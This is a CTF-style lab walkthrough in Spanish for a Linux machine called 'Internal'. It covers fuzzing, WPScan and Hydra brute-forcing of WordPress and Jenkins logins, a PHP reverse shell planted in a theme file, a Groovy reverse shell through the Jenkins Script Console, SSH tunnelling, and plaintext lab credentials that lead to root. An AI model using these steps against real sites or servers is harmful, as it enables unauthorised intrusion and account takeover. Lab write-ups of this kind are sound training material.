# Internal

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux mediante la explotación de un sitio **WordPress**, obtener acceso inicial a través de la modificación de un tema, recuperar credenciales almacenadas en el sistema, acceder mediante **SSH** y comprometer una instancia interna de **Jenkins** para obtener las credenciales del usuario **root** y completar el acceso privilegiado al sistema.

---

## 🛠️ Tecnologías trabajadas

- AutoNmap
- Incursore
- FFUF
- WordPress
- WPScan
- Hydra
- PHP Reverse Shell
- SSH
- SSH Port Forwarding
- Jenkins
- Groovy
- Docker

---

## 🧠 Metodología

La enumeración inicial mostró una superficie de ataque reducida formada únicamente por **SSH** y un servidor web. El reconocimiento permitió identificar un sitio **WordPress**, cuya enumeración mediante **WPScan** reveló tanto la versión instalada como un usuario válido. Tras obtener las credenciales mediante un ataque de fuerza bruta, fue posible acceder al panel de administración y conseguir una **reverse shell** modificando uno de los archivos del tema.

Con acceso al sistema, la enumeración local permitió localizar un archivo con credenciales pertenecientes a otro usuario, lo que facilitó el acceso mediante **SSH**. Desde esta nueva sesión se descubrió una instancia de **Jenkins** ejecutándose internamente dentro de un contenedor Docker, inaccesible desde el exterior.

Mediante **SSH Port Forwarding** expuse el servicio de Jenkins en mi máquina atacante, obteniendo acceso al panel tras un ataque de fuerza bruta. Finalmente, utilicé la **Script Console** para ejecutar una reverse shell como el usuario `jenkins`, recuperando unas credenciales de **root** almacenadas en el sistema y accediendo mediante **SSH** al usuario privilegiado.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé realizando un reconocimiento con **AutoNmap** e **Incursore**.

Los servicios detectados fueron:

| Puerto | Servicio |
|---------|----------|
| 22 | SSH |
| 80 | HTTP |

La máquina únicamente exponía un servicio web y SSH, por lo que la explotación comenzó sobre la aplicación alojada en el puerto 80.

---

### 2. Enumeración web

Accedí al sitio web principal.

```text
http://10.130.166.168
```

La página inicial no proporcionaba información útil, por lo que realicé un fuzzing de directorios.

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.130.166.168/FUZZ
```

Los recursos encontrados fueron:

- `/blog`
- `/javascript`
- `/phpmyadmin`
- `/wordpress`
- `/server-status`

El directorio más interesante correspondía a:

```text
/blog
```

donde se encontraba una instalación de **WordPress**.

También identifiqué un panel de autenticación de **phpMyAdmin**.

```text
http://10.130.166.168/phpmyadmin
```

Realicé un nuevo fuzzing sobre el directorio del blog, descubriendo los directorios habituales de WordPress.

- `wp-admin`
- `wp-content`
- `wp-includes`

---

### 3. Enumeración de WordPress

Utilicé **WPScan** para obtener información sobre la instalación.

```bash
wpscan --url http://internal.thm/blog --enumerate u,vp
```

La herramienta identificó:

Versión:

```text
WordPress 5.4.2
```

Usuario:

```text
admin
```

Posteriormente lancé un ataque de fuerza bruta utilizando **rockyou.txt**.

```bash
wpscan --url http://internal.thm/blog --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```

Resultado:

```text
admin:my2boys
```

Con estas credenciales obtuve acceso al panel de administración.

---

### 4. Acceso inicial

Una vez autenticado accedí al editor de temas.

```text
Appearance → Theme Editor → Theme Footer
```

Sustituí el contenido del archivo por una **PHP Reverse Shell**.

Preparé un listener.

```bash
nc -lvnp 4444
```

Posteriormente recargué la página principal.

```text
http://internal.thm/blog
```

Recibí una shell como:

```text
www-data
```

Con ello conseguí el acceso inicial al sistema.

---

### 5. Enumeración local

Tras estabilizar la TTY comencé la enumeración del sistema.

Identifiqué la existencia del usuario:

```text
aubreanna
```

Sin embargo, no disponía de permisos para acceder a su directorio personal.

Busqué archivos de texto potencialmente interesantes.

```bash
find / -name "*.txt" 2>/dev/null
```

Entre ellos encontré:

```text
/opt/wp-save.txt
```

Su contenido revelaba las siguientes credenciales.

```text
aubreanna:bubb13guM!@#123
```

---

### 6. Acceso mediante SSH

Utilicé las credenciales recuperadas para acceder al sistema.

```bash
ssh aubreanna@10.130.166.168
```

Contraseña:

```text
bubb13guM!@#123
```

Una vez autenticado recuperé la flag de usuario.

```bash
cat user.txt
```

---

### 7. Descubrimiento de Jenkins

Durante la enumeración encontré un archivo llamado:

```text
jenkins.txt
```

El documento indicaba la existencia de una instancia de **Jenkins**.

Comprobé su disponibilidad.

```bash
curl http://172.17.0.2:8080
```

Observé que el servicio se encontraba ejecutándose dentro de un contenedor Docker y únicamente era accesible desde la propia máquina.

---

### 8. Tunelización SSH

Para acceder al servicio desde mi máquina establecí un túnel SSH.

```bash
ssh -N -L 1234:172.17.0.2:8080 aubreanna@10.130.166.168
```

Verifiqué que el puerto estaba correctamente expuesto.

```bash
nmap -sCV -p1234 127.0.0.1
```

Finalmente accedí al panel.

```text
http://127.0.0.1:1234
```

---

### 9. Acceso a Jenkins

Suponiendo la existencia del usuario `admin`, lancé un ataque de fuerza bruta mediante **Hydra**.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 1234 -f http-post-form '/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password'
```

Resultado:

```text
admin:spongebob
```

Con estas credenciales obtuve acceso al panel de administración de Jenkins.

---

### 10. Obtención de una shell mediante Jenkins

Accedí a:

```text
Manage Jenkins → Script Console
```

Preparé una **Groovy Reverse Shell**.

Antes de ejecutarla inicié un listener.

```bash
nc -lvnp 4444
```

Tras ejecutar el script recibí una shell como:

```text
jenkins
```

---

### 11. Obtención de credenciales de root

Durante la enumeración del usuario `jenkins` revisé el contenido del directorio:

```text
/opt
```

Encontré el archivo:

```text
note.txt
```

Su contenido almacenaba las credenciales del usuario **root**.

```text
root:tr0ub13guM!@#123
```

---

### 12. Acceso como root

Utilicé las credenciales recuperadas para acceder directamente mediante **SSH**.

```bash
ssh root@10.130.166.168
```

Contraseña:

```text
tr0ub13guM!@#123
```

Con ello obtuve acceso completo al sistema.

---

### 13. Obtención de la flag final

Accedí al directorio del administrador.

```bash
cd /root
```

Leí el archivo:

```bash
cat root.txt
```

---

## 📚 Lecciones aprendidas

- Este laboratorio permitió recorrer una cadena de explotación muy representativa de un entorno real, combinando vulnerabilidades web, reutilización de credenciales, movimiento lateral y compromiso de servicios internos.
- Enumerar instalaciones de **WordPress** utilizando **WPScan**.
- Identificar usuarios y versiones vulnerables de WordPress.
- Realizar ataques de fuerza bruta sobre WordPress.
- Obtener acceso inicial modificando archivos de un tema mediante el editor integrado.
- Estabilizar una shell obtenida desde un servidor web.
- Localizar credenciales almacenadas en archivos internos del sistema.
- Utilizar credenciales reutilizadas para acceder mediante **SSH**.
- Descubrir servicios internos ejecutándose en contenedores Docker.
- Utilizar **SSH Port Forwarding** para acceder a servicios internos.
- Realizar ataques de fuerza bruta sobre **Jenkins**.
- Obtener una shell mediante la **Script Console** utilizando Groovy.
- Identificar credenciales privilegiadas almacenadas de forma insegura.
- Obtener acceso completo mediante **SSH** al usuario **root**.
